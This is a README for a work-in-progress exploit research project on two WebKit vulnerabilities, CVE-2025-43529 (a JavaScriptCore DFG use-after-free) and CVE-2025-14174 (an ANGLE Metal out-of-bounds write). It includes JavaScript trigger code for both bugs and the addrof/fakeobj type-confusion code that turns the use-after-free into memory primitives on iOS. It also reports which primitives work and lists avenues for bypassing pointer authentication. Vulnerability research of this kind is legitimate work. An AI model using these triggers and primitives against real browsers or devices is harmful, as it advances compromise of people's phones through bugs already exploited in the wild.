# WebKit-UAF-ANGLE-OOB-Analysis (CVE-2025-43529, CVE-2025-14174)

**Author:** [zeroxjf](https://x.com/zeroxjf)<br>
**Status:** Work in Progress<br>
**Test Device:** iPhone 11 Pro Max, iOS 26.1<br>
**Last Updated:** January 2026

---

## Disclaimer

This is an **ongoing research project**. The exploit achieves `addrof`/`fakeobj` primitives but full arbitrary read/write is blocked by arm64e PAC. This repo is my independent analysis of bugs discovered by Google TAG and Apple.

---

## Overview

Two WebKit CVEs disclosed together, exploited in the wild as part of an "extremely sophisticated attack against specific targeted individuals" (per Apple).

| CVE | Component | Type | Summary |
|-----|-----------|------|---------|
| CVE-2025-43529 | JavaScriptCore | Use-After-Free | DFG JIT missing write barrier leads to GC freeing live objects |
| CVE-2025-14174 | ANGLE (GPU) | Out-of-Bounds Write | Metal backend uses wrong height for staging buffer allocation |

---

## CVE-2025-43529: WebKit DFG Store Barrier UAF

### Root Cause

The vulnerability exists in JavaScriptCore's DFG JIT compiler, specifically in the **Store Barrier Insertion Phase** (`DFGStoreBarrierInsertionPhase.cpp`).

The bug occurs when a **Phi node escapes** but its **Upsilon inputs are not marked as escaped**. This causes subsequent stores to those objects to lack write barriers, allowing the garbage collector to free objects that are still reachable.

### Trigger Mechanism

```javascript
function triggerUAF(flag, k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    arr[arr_index] = A;  // A in old space

    let a = new Date(1111);
    a[0] = 1.1;  // Creates butterfly for Date

    // Force GC
    for (let j = 0; j < allocCount; ++j) {
        forGC.push(new ArrayBuffer(0x800000));
    }

    let b = { p0: 0x42424242, p1: 1.1 };

    // Phi node - the bug
    let f = b;
    if (flag) f = 1.1;

    A.p1 = f;  // Phi escapes, but 'b' NOT marked as escaped

    // Long loop = GC race window
    for (let i = 0; i < 1e6; ++i) { /* ... */ }

    b.p1 = a;  // NO WRITE BARRIER - 'a' freed while still reachable
}
```

### Exploitation

The freed Date's butterfly can be reclaimed by spray arrays, creating a type confusion:

```javascript
// After reclaim:
boxed_arr[0] = obj;           // Store object reference
addr = ftoi(unboxed_arr[0]);  // Read as float64 = leaked address

unboxed_arr[0] = itof(addr);  // Write address as float64
fake = boxed_arr[0];          // Read as object = fakeobj
```

### Current Results (iPhone 11 Pro Max, iOS 26.1)

- **addrof/fakeobj:** Verified in probe runs
- **Address leaking:** 20+ object addresses captured per run
- **Inline-storage read/write:** Verified against known inline slots (object-address-based)
- **Arbitrary R/W:** Not proven; arb r/w proof via backing-store scan fails in current runs

---

## CVE-2025-14174: ANGLE Metal Backend OOB Write

### Root Cause

In ANGLE's Metal backend (`TextureMtl.cpp`), staging buffer allocation uses `UNPACK_IMAGE_HEIGHT` instead of actual texture height when uploading via PBO.

### Trigger

```javascript
gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 16);  // Small value

// Staging buffer: 256 * 16 * 4 = 16KB
// Actual write:   256 * 256 * 4 = 256KB
// OOB: 240KB!

gl.texImage2D(gl.TEXTURE_2D, 0, gl.DEPTH_COMPONENT32F,
              256, 256, 0, gl.DEPTH_COMPONENT, gl.FLOAT, 0);
```

---

## The PAC Problem

### What's Blocking Full Exploitation

On arm64e (iPhone 11 Pro Max), **Pointer Authentication Codes** protect critical JSC pointers:

| Pointer | Protected | Result |
|---------|-----------|--------|
| TypedArray `m_vector` | Yes | Cannot fake TypedArray with arbitrary backing store |
| JSArray `butterfly` | Yes | Cannot fake JSArray with arbitrary butterfly |

When I try to create a fake TypedArray/JSArray with an arbitrary data pointer, the CPU's PAC verification fails and crashes:

```
Exception: EXC_BAD_ACCESS
KERN_INVALID_ADDRESS at 0x0001fffffffffffc -> 0x0000007ffffffffc
(possible pointer authentication failure)
```

### Why The Original Confusion Works

The type confusion succeeds because both arrays use **legitimately signed** butterfly pointers - we're just reinterpreting the same memory. Fake objects with arbitrary unsigned pointers crash on PAC check.

### Potential Bypass Avenues

1. JIT code paths that might skip authentication
2. Gadgets that sign arbitrary pointers
3. Leveraging the ANGLE OOB differently
4. Alternative primitives that don't require fake objects

---

## Current Capabilities

| Primitive | Status | Notes |
|-----------|--------|-------|
| `addrof(obj)` | **Working** | Verified in probe |
| `fakeobj(addr)` | **Working** | Verified against known objects |
| Address leaking | **Working** | 20+ addresses per run |
| Inline slot read/write | **Working** | Verified on known inline slots (object-address-based) |
| `read64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |
| `write64(addr)` | Unverified | Constructed via inline-slot trick, proof failed |

---

## Evidence Summary (Latest Probe Run)

- **Verified:** `addrof`, `fakeobj`, address leaks, inline-slot read/write on known objects
- **Unverified:** arbitrary `read64`/`write64`, renderer→GPU escape chain, sandbox escape
- **ANGLE probe:** WebGL2 PBO path implemented; trigger not confirmed in current runs

---

## Repository Structure

```
├── README.md                 # This file
├── poc/
│   └── chained_exploit_probe.html
└── analysis/
    ├── pac_analysis.md       # Detailed PAC findings
    └── crash_logs/           # Example crash reports
```

---

## References

- WebKit Bugzilla: 302502, 303614
- Apple Security Updates - iOS 26
- Google Threat Analysis Group

---

**Work in progress.**
